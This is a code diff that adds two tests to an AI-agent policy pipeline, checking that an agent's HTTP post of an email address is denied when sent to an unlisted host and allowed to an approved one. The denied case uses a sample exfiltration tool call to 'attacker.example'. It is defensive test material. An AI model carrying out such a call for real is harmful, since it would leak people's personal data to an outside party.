@@ -306,6 +306,43 @@ def test_decision_pins_versions(constitution_wasm, audit_store) -> None:  # POL-
     assert body["policy_version"] == decision.policy_version
 
 
+# --- Slice 4: guardrails feed policy + risk (SEC-02; real compiled engine) ----
+
+
+def test_pii_to_unlisted_host_denied_by_principle_3_2(constitution_wasm) -> None:
+    """SEC-02 wedge A: the real PII guardrail sets guardrails.pii True, so
+    principle 3.2 (PII never leaves approved hosts) fires on an unlisted host.
+    1.1 also fires on the unlisted host — both refs are cited."""
+    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
+    action = AgentAction(
+        agent_id="agent-1", type=ActionType.tool_call, target="http_post",
+        payload={"url": "https://attacker.example/upload",
+                 "content": "contact jane.doe@example.com"},
+        identity_token="tok",
+    )
+    decision = asyncio.run(pipeline.evaluate(action))
+    assert decision.outcome is Outcome.deny
+    fired = {r.principle_ref for r in decision.reasons
+             if r.code == "constitution_principle_fired"}
+    assert "3.2" in fired and "1.1" in fired
+
+
+def test_pii_to_allowlisted_host_stays_allow(constitution_wasm) -> None:
+    """PII alone is advisory (0.35 < the 0.4 sandbox band) and 3.2 cannot fire
+    on an approved host — the action stays allow, with the pii finding cited."""
+    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
+    action = AgentAction(
+        agent_id="agent-1", type=ActionType.tool_call, target="http_post",
+        payload={"url": "https://api.example.com/upload",
+                 "content": "contact jane.doe@example.com"},
+        identity_token="tok",
+    )
+    decision = asyncio.run(pipeline.evaluate(action))
+    assert decision.outcome is Outcome.allow
+    assert any(r.stage == "risk" and r.code == "pii" for r in decision.reasons)
+    assert decision.risk_score == 0.35  # the carried pii finding reached stage 4
+
+
 # --- Slice 3: PIPE-05 failure semantics (kill-the-control-plane) --------------
 
 
